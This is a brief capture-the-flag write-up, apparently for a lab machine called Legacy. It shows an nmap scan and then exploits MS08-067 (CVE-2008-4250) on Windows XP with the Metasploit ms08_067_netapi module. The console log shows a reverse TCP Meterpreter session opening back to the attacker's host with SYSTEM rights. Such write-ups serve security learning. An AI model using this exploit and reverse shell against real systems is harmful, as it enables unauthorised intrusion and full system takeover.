# Legacy Write-up

\# BlueBrain

## Enumeration

### Nmap

```
nmap -T4 -A -v 10.10.10.4
```

Nmap reveals that SMB is open, and also identifies the operating system as Windows XP.

## Exploitation

Some searching turns up with CVE-2008-4250, which also has a Metasploit module available for it. Running the module immediately grants a root shell.

Note: in some cases the module target must be set for the exploit to work. If so, Windows XP SP3 English is the correct target.

Module: exploit/windows/smb/ms08_067_netapi

```
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.16.12:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176198 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.16.12:4444 -> 10.10.10.4:1035) at 2024-05-26 14:21:32 -0400

meterpreter > pwd
C:\WINDOWS\system32
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```